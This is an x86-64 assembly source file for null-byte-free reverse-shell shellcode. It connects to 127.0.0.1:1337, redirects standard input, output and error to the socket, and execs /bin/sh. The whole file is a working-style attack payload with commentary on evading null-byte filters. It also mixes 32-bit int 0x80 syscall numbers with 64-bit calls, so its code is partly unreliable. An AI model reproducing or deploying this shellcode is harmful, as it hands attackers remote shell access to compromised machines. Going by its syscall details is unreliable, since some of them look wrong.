section .text
global _start

_start:
    xor rax, rax ; clear rax, this results in no 0 bytes in the shellcode
    xor rbx, rbx ; clear rbx, this results in no 0 bytes in the shellcode
    xor rcx, rcx ; clear rcx, this results in no 0 bytes in the shellcode
    xor rdx, rdx ; clear rdx, this results in no 0 bytes in the shellcode
_socket:
    ; we use the bl,cl,dl registers instead of rbx rcx rdx registers because
    ; they result in extra 0 bytes in the shell code
    mov bl, 2 ; AF_INET
    mov cl, 1 ; SOCK_STREAM
    mov dl, 6 ; IPPROTO_TCP
    mov ax, 359; sys_socket
    int 0x80 ; syscall
    mov rdi, rax ; save file descriptor to rdi because connect() expects it there, we can also use rdi in dup2

_connect:
    mov rbx, 0x0100007f39050002 ; 127.0.0.1:1337 AF_INET
    push rbx ; use rbx here, because we overwrite it afterwards, so we save a xor to clear it
    mov al, 42 ; connect
    ; rdi is normally set, but we've already set it it in _socket
    mov rsi, rsp
    mov dl, 0x10
    syscall

    xor rcx, rcx
    push rcx ; push zeroes on stack so that we have 0 bytes after /bin/sh
_dup2:
    mov rbx, rdi
    mov al, 63 ; dup2
    int 0x80

    inc cl ; increment cl so that it becomes, 1 (stdin) -> 2 (stderr)
    cmp cl, 3; did we reach stderr yet?
    jnz _dup2

_execve:
    ; prepare execing bin/bash
    mov rbx, `//bin/sh` ; use rbx here, because we don't depend on it afterwards, so we save a xor to clear it
    push rbx

    mov al, 59 ; execve, use al, this results in no 0 bytes in the shellcode
    mov rdi, rsp
    xor rsi, rsi
    xor rdx, rdx
    syscall

_exit:
    mov rax, 1
    mov rbx, 0
    int 0x80